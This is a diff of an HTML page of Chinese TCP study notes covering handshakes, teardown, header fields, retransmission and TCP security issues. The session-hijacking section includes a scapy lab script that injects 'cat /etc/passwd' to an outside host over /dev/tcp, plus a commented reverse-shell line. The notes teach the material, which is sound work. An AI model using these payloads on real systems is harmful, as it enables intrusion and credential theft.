@@ -1,57 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-15 Wed 22:05 -->
+<!-- 2023-05-28 Sun 00:55 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>TCP</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
 
-                     <!--
-                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
-                     -->
-                     <!--
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
-                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
-                     -->
                      <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
                      <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
                      <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
                      <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
                      <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
                      <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        displayAlign: "center",
-        displayIndent: "0em",
-
-        "HTML-CSS": { scale: 100,
-                        linebreaks: { automatic: "false" },
-                        webFont: "TeX"
-                       },
-        SVG: {scale: 100,
-              linebreaks: { automatic: "false" },
-              font: "TeX"},
-        NativeMML: {scale: 100},
-        TeX: { equationNumbers: {autoNumber: "AMS"},
-               MultLineWidth: "85%",
-               TagSide: "right",
-               TagIndent: ".8em"
-             }
-});
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '%MULTLINEWIDTH'
+      },
+      tags: '%TAGS',
+      tagSide: '%TAGSIDE',
+      tagIndent: '%TAGINDENT'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '2em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '2em'
+    },
+    output: {
+      font: '%FONT',
+      displayOverflow: '%OVERFLOW'
+    }
+  };
 </script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
 </head>
 <body>
 <div id="content" class="content">
@@ -61,74 +55,74 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgda6f289">TCP Connection</a>
+<li><a href="#org955108f">TCP Connection</a>
 <ul>
-<li><a href="#org649e366">半连接队列和全连接队列</a></li>
+<li><a href="#org66249c4">半连接队列和全连接队列</a></li>
 </ul>
 </li>
-<li><a href="#orge2679d1">Handshake</a>
+<li><a href="#org6944094">Handshake</a>
 <ul>
-<li><a href="#org63eee39">初始序列号</a></li>
-<li><a href="#orgb7daa9f">SYN 攻击</a></li>
-<li><a href="#org8fe0ec6">四次挥手</a></li>
-<li><a href="#orgd4bfc9c">TCP 保活</a></li>
+<li><a href="#orgb53f0b2">初始序列号</a></li>
+<li><a href="#orgb84253c">SYN 攻击</a></li>
+<li><a href="#org0fe2dd2">四次挥手</a></li>
+<li><a href="#org86d83e5">TCP 保活</a></li>
 </ul>
 </li>
-<li><a href="#org11b821c">MTU MSS</a>
+<li><a href="#org7a68a8b">MTU MSS</a>
 <ul>
-<li><a href="#org7d07e0b">PMTU</a></li>
+<li><a href="#org40aa755">PMTU</a></li>
 </ul>
 </li>
-<li><a href="#org22ffce3">Header Format</a>
+<li><a href="#org0f2c4e5">Header Format</a>
 <ul>
-<li><a href="#org35097a5">Flags</a></li>
+<li><a href="#org41be765">Flags</a></li>
 </ul>
 </li>
-<li><a href="#orgcf9c96c">TCP 有限状态机</a></li>
-<li><a href="#org9bb9f29">TCP 安全问题</a>
+<li><a href="#org5d57d83">TCP 有限状态机</a></li>
+<li><a href="#org2bbc538">TCP 安全问题</a>
 <ul>
-<li><a href="#org39f3f54">会话劫持</a></li>
-<li><a href="#org2712a10">身份仿冒</a></li>
-<li><a href="#org03ec721">DoS 攻击</a></li>
+<li><a href="#org4d5e994">会话劫持</a></li>
+<li><a href="#org32550e7">身份仿冒</a></li>
+<li><a href="#orgcacdb59">DoS 攻击</a></li>
 </ul>
 </li>
-<li><a href="#org93a4d16">TCP 重要机制</a>
+<li><a href="#orgb2d38c1">TCP 重要机制</a>
 <ul>
-<li><a href="#orged5642e">超时重传</a></li>
-<li><a href="#org9cc8f89">快速重传</a></li>
-<li><a href="#org080a796">SACK(Selective Acknowledgment)</a></li>
-<li><a href="#org99ba65f">D-SACK(Duplicate SACK)</a></li>
-<li><a href="#org24c8fdb">滑动窗口</a></li>
-<li><a href="#org05791e5">流量控制</a></li>
-<li><a href="#orgc5c5a37">拥塞控制</a>
+<li><a href="#orgf5db053">超时重传</a></li>
+<li><a href="#org4e5b7c4">快速重传</a></li>
+<li><a href="#org1f503a6">SACK(Selective Acknowledgment)</a></li>
+<li><a href="#orgadf88e5">D-SACK(Duplicate SACK)</a></li>
+<li><a href="#orge9fecd7">滑动窗口</a></li>
+<li><a href="#orgbe2b6d7">流量控制</a></li>
+<li><a href="#org3bef729">拥塞控制</a>
 <ul>
-<li><a href="#org66d6337">慢启动</a></li>
-<li><a href="#orgc77d2a6">拥塞避免</a></li>
-<li><a href="#orgd20c0df">拥塞发生</a></li>
-<li><a href="#orgadd5744">快速恢复</a></li>
+<li><a href="#org936af2c">慢启动</a></li>
+<li><a href="#orge0759f7">拥塞避免</a></li>
+<li><a href="#org45575d4">拥塞发生</a></li>
+<li><a href="#orgaebbc32">快速恢复</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org13b7504">TCP 的一些算法</a>
+<li><a href="#org5268bc1">TCP 的一些算法</a>
 <ul>
-<li><a href="#org39d5146">Nagle</a>
+<li><a href="#org902dea3">Nagle</a>
 <ul>
-<li><a href="#orgd22da6c">改进的 Nagle - Minshall</a></li>
+<li><a href="#org7d9eebc">改进的 Nagle - Minshall</a></li>
 </ul>
 </li>
-<li><a href="#org4481dc9">Delayed Acknowledgment</a></li>
-<li><a href="#orgeba869c">Per-Host PASW(Protect Against Wrapped Sequences)</a></li>
-<li><a href="#org77863ab">SYN Cookies</a></li>
+<li><a href="#org10af302">Delayed Acknowledgment</a></li>
+<li><a href="#org16fbefa">Per-Host PASW(Protect Against Wrapped Sequences)</a></li>
+<li><a href="#org8b35260">SYN Cookies</a></li>
 </ul>
 </li>
-<li><a href="#orga829934">Port Detection&#xa0;&#xa0;&#xa0;<span class="tag"><span class="security">security</span></span></a>
+<li><a href="#org8ab86cd">Port Detection&#xa0;&#xa0;&#xa0;<span class="tag"><span class="security">security</span></span></a>
 <ul>
-<li><a href="#orgc5f6f57">hping3</a></li>
-<li><a href="#org146e98d">nmap</a></li>
+<li><a href="#org2ce9c85">hping3</a></li>
+<li><a href="#orgb876e49">nmap</a></li>
 </ul>
 </li>
-<li><a href="#orgaae50a7">Reference</a></li>
+<li><a href="#org04ddabe">Reference</a></li>
 </ul>
 </div>
 </nav>
@@ -225,9 +219,9 @@ RFC:
 <li><a href="https://datatracker.ietf.org/doc/html/rfc793-">RFC793</a></li>
 </ul>
 
-<div id="outline-container-orgda6f289" class="outline-2">
-<h2 id="orgda6f289">TCP Connection</h2>
-<div class="outline-text-2" id="text-orgda6f289">
+<div id="outline-container-org955108f" class="outline-2">
+<h2 id="org955108f">TCP Connection</h2>
+<div class="outline-text-2" id="text-org955108f">
 <p>
 IP 协议是不可靠的，不保证网络包的交付、按序交付和数据的完整性，所以出现了 TCP 这个用于可靠数据传输的协议，能确保接收端接收到的网络包是无损坏、无间隔、非冗余和按序的。
 总的来说， TCP 是 <b>面向连接的</b> 、 <b>可靠的</b> 、 <b>基于字节流</b> 的传输层通信协议。
@@ -291,9 +285,9 @@ TCP 计算负载的数据长度： TCP 数据的长度 = IP 总长度 - IP 首�
 </p>
 </div>
 
-<div id="outline-container-org649e366" class="outline-3">
-<h3 id="org649e366">半连接队列和全连接队列</h3>
-<div class="outline-text-3" id="text-org649e366">
+<div id="outline-container-org66249c4" class="outline-3">
+<h3 id="org66249c4">半连接队列和全连接队列</h3>
+<div class="outline-text-3" id="text-org66249c4">
 <p>
 LISTEN:
 <code>Recv-Q</code> 当前全连接队列大小
@@ -317,21 +311,23 @@ LISTEN:
 </div>
 </div>
 </div>
-<div id="outline-container-orge2679d1" class="outline-2">
-<h2 id="orge2679d1">Handshake</h2>
-<div class="outline-text-2" id="text-orge2679d1">
-<pre class="example">
-Client                   Server
+<div id="outline-container-org6944094" class="outline-2">
+<h2 id="org6944094">Handshake</h2>
+<div class="outline-text-2" id="text-org6944094">
+<div class="org-src-container">
+<pre class="src src-nil">Client                   Server
    |     -----SYN----&gt;     |
    |     &lt;--SYN+ACK---     |
    |     -----ACK----&gt;     |
 Client                   Server
 </pre>
-<pre class="example">
-SYN_1 : Seq Num = Client_ISN
+</div>
+<div class="org-src-container">
+<pre class="src src-nil">SYN_1 : Seq Num = Client_ISN
 SYN_2, ACK_1 : Seq Num = Srever_ISN, Ack Num = Client_ISN + 1
 ACK_2 : Ack Num = Server_ISN + 1
 </pre>
+</div>
 
 <p>
 前两次握手因为是 SYN ，不能携带数据，消耗序列号；第三次握手是 ACK ，可以携带数据，但不带数据的就不会消耗序列号。
@@ -348,9 +344,9 @@ ACK_2 : Ack Num = Server_ISN + 1
 </ul>
 </div>
 
-<div id="outline-container-org63eee39" class="outline-3">
-<h3 id="org63eee39">初始序列号</h3>
-<div class="outline-text-3" id="text-org63eee39">
+<div id="outline-container-orgb53f0b2" class="outline-3">
+<h3 id="orgb53f0b2">初始序列号</h3>
+<div class="outline-text-3" id="text-orgb53f0b2">
 <p>
 如果一个已经失效的连接被重用了，但是该旧连接的历史报文还残留在网络中，如果序列号相同，那么就无法分辨出该报文是不是历史报文，而若造成历史报文被新的连接接受了，则会产生数据错乱。
 一方面每次建立连接前重新初始化一个序列号主要是为了通信双方能够根据序号将不属于本连接的数据报丢弃。另一方面为了安全性，防止黑客伪造相同的序列号的 TCP 报文从而造成被会话劫持等攻击。
@@ -361,9 +357,9 @@ F 为 Hash 算法，根据四元组和可选的秘密生成一个随机数值，
 </div>
 </div>
 
-<div id="outline-container-orgb7daa9f" class="outline-3">
-<h3 id="orgb7daa9f">SYN 攻击</h3>
-<div class="outline-text-3" id="text-orgb7daa9f">
+<div id="outline-container-orgb84253c" class="outline-3">
+<h3 id="orgb84253c">SYN 攻击</h3>
+<div class="outline-text-3" id="text-orgb84253c">
 <p>
 攻击者段时间内伪造不同 IP 地址的 SYN 报文，服务器接收到 SYN 报文进入 SYN_RCVD （半连接）状态，但回应的 SYN + ACK 报文无法得到未知 IP 主机的应答，久而久之占满 SYN 接收队列（未连接队列），导致服务器不能为正常用户服务。
 </p>
@@ -391,11 +387,11 @@ Linux 处理 TCP 连接的流程：
 </div>
 </div>
 
-<div id="outline-container-org8fe0ec6" class="outline-3">
-<h3 id="org8fe0ec6">四次挥手</h3>
-<div class="outline-text-3" id="text-org8fe0ec6">
-<pre class="example">
-      TCP A                                                TCP B
+<div id="outline-container-org0fe2dd2" class="outline-3">
+<h3 id="org0fe2dd2">四次挥手</h3>
+<div class="outline-text-3" id="text-org0fe2dd2">
+<div class="org-src-container">
+<pre class="src src-nil">      TCP A                                                TCP B
 
   1.  ESTABLISHED                                          ESTABLISHED
 
@@ -412,6 +408,7 @@ Linux 处理 TCP 连接的流程：
   6.  (2 MSL)
       CLOSED
 </pre>
+</div>
 
 <p>
 主动关闭连接的才有 <code>TIME_WAIT</code> 状态。
@@ -451,10 +448,10 @@ MSL 的单位是秒， TTL 的单位是路由跳数， MSL 要大于 TTL 消耗�
 设置 <a href="20220718-socket.html#ID-8f85e772-fcef-4d79-9314-c30b08caa0b1">Socket</a> 选项调整 close 关闭连接的行为：
 </p>
 <div class="org-src-container">
-<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">linger</span> <span style="color: #BA36A5;">so_linger</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_onff</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_linger</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-<span style="color: #006DAF;">setsockopt</span><span style="color: #707183; background-color: #FFFFFF;">(</span>s<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SOL_SOCKET</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SO_LINGER</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">&amp;</span>so_linger<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">sizeof</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>so_linger<span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #707183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">linger</span> <span style="color: #BA36A5;">so_linger</span>;
+so_linger.l_onff = <span style="color: #D0372D;">1</span>;
+so_linger.l_linger = <span style="color: #D0372D;">0</span>;
+<span style="color: #006699;">setsockopt</span>(s, SOL_SOCKET, SO_LINGER, &amp;so_linger, <span style="color: #0000FF;">sizeof</span>(so_linger));
 </pre>
 </div>
 <p>
@@ -463,9 +460,9 @@ so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span 
 </ul>
 </div>
 </div>
-<div id="outline-container-orgd4bfc9c" class="outline-3">
-<h3 id="orgd4bfc9c">TCP 保活</h3>
-<div class="outline-text-3" id="text-orgd4bfc9c">
+<div id="outline-container-org86d83e5" class="outline-3">
+<h3 id="org86d83e5">TCP 保活</h3>
+<div class="outline-text-3" id="text-org86d83e5">
 <p>
 定义一个时间段，在这个时间段内，如果没有任何连接相关的活动，TCP 保活机制会开始作用，每隔一个时间间隔，发送一个探测报文，该探测包含的数据非常少，如果连续几个探测保温都没有得到响应，则认为当前 TCP 连接已经死亡，系统内核将错误通知给上层应用程序。
 </p>
@@ -473,11 +470,12 @@ so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span 
 <p>
 Linux 内核相关设置：
 </p>
-<pre class="example">
-net.ipv4.tcp_keepalive_time = 7200 # 保活时间 7200 秒
+<div class="org-src-container">
+<pre class="src src-nil">net.ipv4.tcp_keepalive_time = 7200 # 保活时间 7200 秒
 net.ipv4.tcp_keepalive_intvl = 75  # 检测间隔 75   秒
 net.ipv4.tcp_keepalive_probes = 9  # 探测次数 9    次
 </pre>
+</div>
 <p>
 则需要 7875 秒才发现一个死亡连接。
 </p>
@@ -491,9 +489,9 @@ net.ipv4.tcp_keepalive_probes = 9  # 探测次数 9    次
 </div>
 </div>
 
-<div id="outline-container-org11b821c" class="outline-2">
-<h2 id="org11b821c">MTU MSS</h2>
-<div class="outline-text-2" id="text-org11b821c">
+<div id="outline-container-org7a68a8b" class="outline-2">
+<h2 id="org7a68a8b">MTU MSS</h2>
+<div class="outline-text-2" id="text-org7a68a8b">
 <p>
 MTU(Maximum Transmission Unit): 一个网络包的最大长度，以太网一般为 1500 字节
 </p>
@@ -515,9 +513,9 @@ MSS(Maximun Segment Size)     : 除去 IP 和 TCP 头部后，一个网络包所
 </p>
 </div>
 
-<div id="outline-container-org7d07e0b" class="outline-3">
-<h3 id="org7d07e0b">PMTU</h3>
-<div class="outline-text-3" id="text-org7d07e0b">
+<div id="outline-container-org40aa755" class="outline-3">
+<h3 id="org40aa755">PMTU</h3>
+<div class="outline-text-3" id="text-org40aa755">
 <p>
 Path MTU Discovery: 路径 MTU 发现协议，利用 IP 数据包头的 DF(Don&rsquo;t Fragment) 字段表示不允许分片，这样在链路中遇到路由器的 MTU 小于 IP 报文的长度时，路由器会通过 ICMP 协议通知发送端数据需要分片及自己的 MTU 大小。
 </p>
@@ -525,11 +523,11 @@ Path MTU Discovery: 路径 MTU 发现协议，利用 IP 数据包头的 DF(Don&r
 </div>
 </div>
 
-<div id="outline-container-org22ffce3" class="outline-2">
-<h2 id="org22ffce3">Header Format</h2>
-<div class="outline-text-2" id="text-org22ffce3">
-<pre class="example">
-    0                   1                   2                   3
+<div id="outline-container-org0f2c4e5" class="outline-2">
+<h2 id="org0f2c4e5">Header Format</h2>
+<div class="outline-text-2" id="text-org0f2c4e5">
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>TCP Header Format</label><pre class="src src-nil">    0                   1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |          Source Port          |       Destination Port        |
@@ -549,6 +547,7 @@ Path MTU Discovery: 路径 MTU 发现协议，利用 IP 数据包头的 DF(Don&r
    |                             data                              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 </pre>
+</div>
 
 <p>
 Sequence Number: 建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据就 <b>累加</b> 一次 <b>所发送的数据的字节数</b> 的大小。用来解决网络包乱序问题
@@ -559,9 +558,9 @@ Acknowledgment Number: 指下一次 <b>期望</b> 收到的数据的序列号（
 </p>
 </div>
 
-<div id="outline-container-org35097a5" class="outline-3">
-<h3 id="org35097a5">Flags</h3>
-<div class="outline-text-3" id="text-org35097a5">
+<div id="outline-container-org41be765" class="outline-3">
+<h3 id="org41be765">Flags</h3>
+<div class="outline-text-3" id="text-org41be765">
 <table>
 <caption class="t-above"><span class="table-number">Table 1:</span> Function of flags of TCP</caption>
 
@@ -617,19 +616,19 @@ ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t
 </div>
 </div>
 
-<div id="outline-container-orgcf9c96c" class="outline-2">
-<h2 id="orgcf9c96c">TCP 有限状态机</h2>
-<div class="outline-text-2" id="text-orgcf9c96c">
+<div id="outline-container-org5d57d83" class="outline-2">
+<h2 id="org5d57d83">TCP 有限状态机</h2>
+<div class="outline-text-2" id="text-org5d57d83">
 
-<figure id="org5e68321">
+<figure id="org496cb8b">
 <img src="../images/20220715-tcp_1.png" alt="20220715-tcp_1.png">
 
 </figure>
 </div>
 </div>
-<div id="outline-container-org9bb9f29" class="outline-2">
-<h2 id="org9bb9f29">TCP <a href="20220708-information_security.html#ID-f206c9e0-f8d8-4b31-b74e-449365305a46">安全</a>问题</h2>
-<div class="outline-text-2" id="text-org9bb9f29">
+<div id="outline-container-org2bbc538" class="outline-2">
+<h2 id="org2bbc538">TCP <a href="20220708-information_security.html#ID-f206c9e0-f8d8-4b31-b74e-449365305a46">安全</a>问题</h2>
+<div class="outline-text-2" id="text-org2bbc538">
 <p>
 在 TCP 协议下，利用伪造的数据包，可以：
 </p>
@@ -642,9 +641,9 @@ ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t
 </ul>
 </div>
 
-<div id="outline-container-org39f3f54" class="outline-3">
-<h3 id="org39f3f54">会话劫持</h3>
-<div class="outline-text-3" id="text-org39f3f54">
+<div id="outline-container-org4d5e994" class="outline-3">
+<h3 id="org4d5e994">会话劫持</h3>
+<div class="outline-text-3" id="text-org4d5e994">
 <p>
 伪造数据包让一方接受这个伪造的数据包的攻击方式，一台计算机可以有多个并发的TCP会话，因此它需要知道一个数据包属于哪一个TCP会话。TCP使用4元组来唯一确定一个会话： 源IP地址、目的IP地址、源端口号、目的端口号，这4个域称为TCP会话的特征。
 为了伪造数据包，除了上面四个特征必须符合外，还有一个关键的序列号必须符合。
@@ -654,32 +653,32 @@ ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t
 危害：如果接收方是 telnet 服务器，那从发送方到接收方的数据就是命令，一旦控制了该会话，就可以让 telnet 服务器运行攻击者的命令， 这就是把这类攻击称为 TCP 会话劫持的原因。具体是在客户端连接到服务器时，攻击者抓包得到序列号从而伪造数据包。例如：
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #8D8D84; font-style: italic;">#!/usr/bin/env python3</span>
-<span style="color: #008000;">'''</span>
-<span style="color: #008000;">http://note.blueegg.net.cn/seed-labs/tcp/session-attack/</span>
-<span style="color: #008000;">'''</span>
+<pre class="src src-python"><span style="color: #8D8D84;">#</span><span style="color: #8D8D84; font-style: italic;">!/usr/bin/env python3</span>
+<span style="color: #036A07;">'''</span>
+<span style="color: #036A07;">http://note.blueegg.net.cn/seed-labs/tcp/session-attack/</span>
+<span style="color: #036A07;">'''</span>
 <span style="color: #0000FF;">import</span> sys
-<span style="color: #0000FF;">from</span> scapy.all <span style="color: #0000FF;">import</span> <span style="color: #0000FF;">*</span>
+<span style="color: #0000FF;">from</span> scapy.<span style="color: #006FE0;">all</span> <span style="color: #0000FF;">import</span> *
 
 <span style="color: #006FE0;">print</span>(<span style="color: #008000;">"SENDING SESSION HIJACKING PACKET....."</span>)
-<span style="color: #BA36A5;">client_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.151"</span>
-<span style="color: #BA36A5;">server_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.150"</span>
+<span style="color: #BA36A5;">client_addr</span> = <span style="color: #008000;">"192.168.230.151"</span>
+<span style="color: #BA36A5;">server_addr</span> = <span style="color: #008000;">"192.168.230.150"</span>
 
-<span style="color: #BA36A5;">IPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">IP</span>(<span style="color: #808080;">src</span><span style="color: #0000FF;">=</span>client_addr, <span style="color: #808080;">dst</span><span style="color: #0000FF;">=</span>server_addr)
-<span style="color: #BA36A5;">TCPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">TCP</span>(<span style="color: #808080;">sport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">38276</span>, <span style="color: #808080;">dport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">23</span>, <span style="color: #808080;">flags</span><span style="color: #0000FF;">=</span><span style="color: #008000;">"A"</span>, <span style="color: #808080;">seq</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">2833231448</span>, <span style="color: #808080;">ack</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">1828464701</span>)
-<span style="color: #BA36A5;">Data</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"</span><span style="color: #0000FF;">\r</span><span style="color: #008000;"> cat /etc/passwd &gt; /dev/tcp/192.168.230.1/9090</span><span style="color: #0000FF;">\r</span><span style="color: #008000;">"</span>
-<span style="color: #8D8D84; font-style: italic;"># Data = "\r /bin/bash -i &gt; /dev/tcp/192.168.230.1/9090 2&gt;&amp;1 0&lt;&amp;1 \r" # get shell</span>
-<span style="color: #BA36A5;">pkt</span> <span style="color: #0000FF;">=</span> <span style="color: #6434A3;">IPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">TCPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">Data</span>
-<span style="color: #006DAF;">ls</span>(pkt)
-<span style="color: #006DAF;">end</span>(pkt, <span style="color: #808080;">verbose</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">0</span>)
+<span style="color: #BA36A5;">IPLayer</span> = IP(src=client_addr, dst=server_addr)
+TCPLayer = TCP(sport=<span style="color: #D0372D;">38276</span>, dport=<span style="color: #D0372D;">23</span>, flags=<span style="color: #008000;">"A"</span>, seq=<span style="color: #D0372D;">2833231448</span>, ack=<span style="color: #D0372D;">1828464701</span>)
+Data = <span style="color: #008000;">"\r cat /etc/passwd &gt; /dev/tcp/192.168.230.1/9090\r"</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Data = "\r /bin/bash -i &gt; /dev/tcp/192.168.230.1/9090 2&gt;&amp;1 0&lt;&amp;1 \r" # get shell</span>
+pkt = IPLayer/TCPLayer/Data
+ls(pkt)
+end(pkt, verbose=<span style="color: #D0372D;">0</span>)
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org2712a10" class="outline-3">
-<h3 id="org2712a10">身份仿冒</h3>
-<div class="outline-text-3" id="text-org2712a10">
+<div id="outline-container-org32550e7" class="outline-3">
+<h3 id="org32550e7">身份仿冒</h3>
+<div class="outline-text-3" id="text-org32550e7">
 <p>
 C - Sender
 </p>
@@ -705,9 +704,9 @@ M 仿冒 C 的地址与 S 通信，M 虽然不会收到 S 发来的报文，但�
 </div>
 </div>
 
-<div id="outline-container-org03ec721" class="outline-3">
-<h3 id="org03ec721">DoS 攻击</h3>
-<div class="outline-text-3" id="text-org03ec721">
+<div id="outline-container-orgcacdb59" class="outline-3">
+<h3 id="orgcacdb59">DoS 攻击</h3>
+<div class="outline-text-3" id="text-orgcacdb59">
 <p>
 M 可以预测 C 和 S 的序列号，在 C 和 S 的通信过程中，假冒任意一方的 IP 地址，频繁抢先一部发送错误的报文：
 </p>
@@ -719,9 +718,9 @@ M 可以预测 C 和 S 的序列号，在 C 和 S 的通信过程中，假冒任
 </div>
 </div>
 
-<div id="outline-container-org93a4d16" class="outline-2">
-<h2 id="org93a4d16">TCP 重要机制</h2>
-<div class="outline-text-2" id="text-org93a4d16">
+<div id="outline-container-orgb2d38c1" class="outline-2">
+<h2 id="orgb2d38c1">TCP 重要机制</h2>
+<div class="outline-text-2" id="text-orgb2d38c1">
 <p>
 需要 TCP 通过采样 RTT 的时间，进行加权平均，算出一个平滑的 RTT 值，这个值会根据网络变化而不断变化；除了采样 RTT ，还要采样 RTT 的波动范围，这样避免如果 RTT 又一个大的波动的话，而导致很难被发现的情况。
 </p>
@@ -746,9 +745,9 @@ Linux 系统中：
 </p>
 </div>
 
-<div id="outline-container-orged5642e" class="outline-3">
-<h3 id="orged5642e">超时重传</h3>
-<div class="outline-text-3" id="text-orged5642e">
+<div id="outline-container-orgf5db053" class="outline-3">
+<h3 id="orgf5db053">超时重传</h3>
+<div class="outline-text-3" id="text-orgf5db053">
 <p>
 超时重传：发送数据时，设置一个定时器，当超出指定的时间后，没有收到对方的 ACK 确认应答报文，就会重发该数据。
 即在 <b>数据包丢失</b> 和 <b>确认应答丢失</b> 这两种情况下发生超时重传。超时重传时间 (RTO, Retransmission Timeout) 一般设置是略大于报文往返 RTT 值。
@@ -757,9 +756,9 @@ Linux 系统中：
 </div>
 </div>
 
-<div id="outline-container-org9cc8f89" class="outline-3">
-<h3 id="org9cc8f89">快速重传</h3>
-<div class="outline-text-3" id="text-org9cc8f89">
+<div id="outline-container-org4e5b7c4" class="outline-3">
+<h3 id="org4e5b7c4">快速重传</h3>
+<div class="outline-text-3" id="text-org4e5b7c4">
 <p>
 Fast Retransmit: 不以时间为驱动，而以数据驱动重传。
 即在某个 TCP 报文丢失时，在超时定时器过期前，连续发送 3 个 ACK 报文，表示有报文丢失，需要重传。
@@ -767,9 +766,9 @@ Fast Retransmit: 不以时间为驱动，而以数据驱动重传。
 </div>
 </div>
 
-<div id="outline-container-org080a796" class="outline-3">
-<h3 id="org080a796">SACK(Selective Acknowledgment)</h3>
-<div class="outline-text-3" id="text-org080a796">
+<div id="outline-container-org1f503a6" class="outline-3">
+<h3 id="org1f503a6">SACK(Selective Acknowledgment)</h3>
+<div class="outline-text-3" id="text-org1f503a6">
 <p>
 在 TCP 头部选项字段里加一个 SACK ，可以将已缓存的数据告诉发送方，这样发送方就知道哪些数据收到了，哪些没收到，于是发送方就可以只重传丢失的数据。
 </p>
@@ -782,18 +781,18 @@ net.ipv4.tcp_sack
 </div>
 </div>
 
-<div id="outline-container-org99ba65f" class="outline-3">
-<h3 id="org99ba65f">D-SACK(Duplicate SACK)</h3>
-<div class="outline-text-3" id="text-org99ba65f">
+<div id="outline-container-orgadf88e5" class="outline-3">
+<h3 id="orgadf88e5">D-SACK(Duplicate SACK)</h3>
+<div class="outline-text-3" id="text-orgadf88e5">
 <p>
 使用 SACK 告诉发送方有哪些数据被重复接收了。在 ACK 丢包和因为网络延时而导致重传报文比原报文先到的时候可以告诉发送方哪些数据被重复接收了。
 </p>
 </div>
 </div>
 
